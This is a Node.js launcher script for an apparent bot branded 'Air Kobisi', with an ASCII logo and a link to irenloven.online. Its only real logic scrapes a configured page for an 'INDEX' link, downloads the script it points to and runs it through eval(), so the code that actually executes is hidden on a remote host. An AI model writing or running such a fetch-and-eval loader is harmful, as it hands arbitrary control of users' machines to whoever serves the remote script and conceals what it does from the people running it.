//  [AIR KOBISI QUANTUM EDITION]                                            
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Air Kobisi™                                          
//  >> Version: 8.3.5-quantum.7
//  >> 🌐 https://irenloven.online

const axios = require('axios');
const cheerio = require('cheerio');
const airkobisi = require("./config");

function showBrandLogo() {
  console.log(`
   ▄▄▄       ██▓ ██▀███   ▓█████▄     ██ ▄█▀ ▒█████   ▄▄▄▄    
  ▒████▄    ▓██▒▓██ ▒ ██▒ ▒██▀ ██▌    ██▄█▒ ▒██▒  ██▒▓█████▄  
  ▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒ ░██   █▌   ▓███▄░ ▒██░  ██▒▒██▒ ▄██ 
  ░██▄▄▄▄██ ░██░▒██▀▀█▄   ░▓█▄   ▌   ▓██ █▄ ▒██   ██░▒██░█▀   
   ▓█   ▓██▒░██░░██▓ ▒██▒ ░▒████▓    ▒██▒ █▄░ ████▓▒░░▓█  ▀█▓ 
   ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░  ▒▒▓  ▒    ▒ ▒▒ ▓▒░ ▒░▒░▒░ ░▒▓███▀▒ 
    ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░  ░ ▒  ▒    ░ ░▒ ▒░  ░ ▒ ▒░ ▒░▒   ░  
    ░   ▒    ▒ ░  ░░   ░   ░ ░  ░    ░ ░░ ░ ░ ░ ░ ▒   ░    ░  
        ░  ░ ░     ░         ░       ░  ░       ░ ░   ░       
                           🔥 Air Kobisi Quantum Engine 🔥
                     🌐 Powered by irenloven.online
`);
}

async function fetchINDEXUrl() {
  try {
    showBrandLogo();
    console.log("🚀 AIR KOBISI BOT INITIALIZING...");
    console.log("🌐 Loading resources from irenloven.online ...");

    const response = await axios.get(airkobisi.INDEX_SOURCE_URL);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('💔 INDEX link not found on irenloven.online 😭');
    }

    console.log('💖 INDEX file loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    console.log("✨ Executing Air Kobisi Quantum Engine...");
    eval(scriptResponse.data);

  } catch (error) {
    console.error('🔥 AIR KOBISI ERROR:', error.message);
  }
}

fetchINDEXUrl();
